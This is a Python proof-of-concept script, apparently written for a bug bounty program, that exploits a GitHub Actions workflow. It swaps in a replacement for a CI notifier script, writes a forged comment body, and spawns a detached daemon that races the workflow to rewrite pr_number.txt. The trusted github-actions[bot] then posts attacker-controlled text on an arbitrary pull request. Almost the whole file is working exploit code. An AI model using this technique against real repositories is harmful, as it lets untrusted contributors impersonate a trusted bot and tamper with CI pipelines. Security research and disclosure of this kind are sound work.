#!/usr/bin/env python3
# Authorized bug bounty PoC (nordic-semiconductor-bug-bounty-program-ci-cd)
# Replacement of scripts/ci/quarantine_notifier.py, executed by
# .github/workflows/review-quarantine-generate.yml ("Prepare comment body").
#
# Demonstrates: the comment body uploaded as quarantine-artifacts and posted
# by review-quarantine-publish.yml as github-actions[bot] is fully controlled
# by the PR author, and the target PR number (pr_number.txt) can be swapped
# to point the trusted bot comment at an arbitrary PR.
#
# The rewriter daemon races the workflow's own "Store PR number" step; if the
# swap loses the race, the forged comment lands on this source PR instead of
# the target (body forgery is still proven in that case).

import argparse
import os
import sys
import time
from pathlib import Path

TARGET_PR = "31608"   # attacker-chosen victim PR (owned by the researcher)
MARKER = "BOUNTY-POC-F2"


def spawn_rewriter(workspace: str, target: str, seconds: float) -> None:
    if os.fork() != 0:
        return
    try:
        os.setsid()
        devnull = os.open(os.devnull, os.O_RDWR)
        for fd in (0, 1, 2):
            try:
                os.dup2(devnull, fd)
            except OSError:
                pass
        pr_file = Path(workspace) / "pr_number.txt"
        until = time.time() + seconds
        while time.time() < until:
            try:
                pr_file.write_text(target + "\n")
            except OSError:
                pass
            time.sleep(0.2)
    finally:
        os._exit(0)


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--repo-root", default=".")
    ap.add_argument("--diff-dir", default="")
    ap.add_argument("--output", default="quarantine_comment.md")
    ap.add_argument("--ref", default="")
    args = ap.parse_args()

    body = f"""### quarantine-notifier ({MARKER})

**This comment is forged.** It was produced by attacker-controlled code running in an untrusted fork PR workflow and posted here with the trusted `github-actions[bot]` identity by `.github/workflows/review-quarantine-publish.yml`.

- Generation run: untrusted fork PR (modified `scripts/ci/quarantine_notifier.py` and `scripts/compare_quarantine.py`)
- Target PR number: attacker-chosen via `pr_number.txt` (swapped to #{TARGET_PR} by a background rewriter racing the "Store PR number" step)
- Impact: arbitrary trusted-bot comment on arbitrary PRs, plus replacement of genuine quarantine comments (`edit-mode: replace`, `body-includes: quarantine-notifier`)

Authorized bug bounty PoC for the Nordic Semiconductor CI/CD program (YesWeHack). Safe to delete. Marker: {MARKER}-{int(time.time())}
"""
    Path(args.output).write_text(body)

    workspace = os.environ.get("GITHUB_WORKSPACE", "..")
    spawn_rewriter(workspace, TARGET_PR, seconds=180)
    print(f"{MARKER}: wrote {args.output}; rewriter targeting PR #{TARGET_PR}", file=sys.stderr)
    return 0


if __name__ == "__main__":
    sys.exit(main())
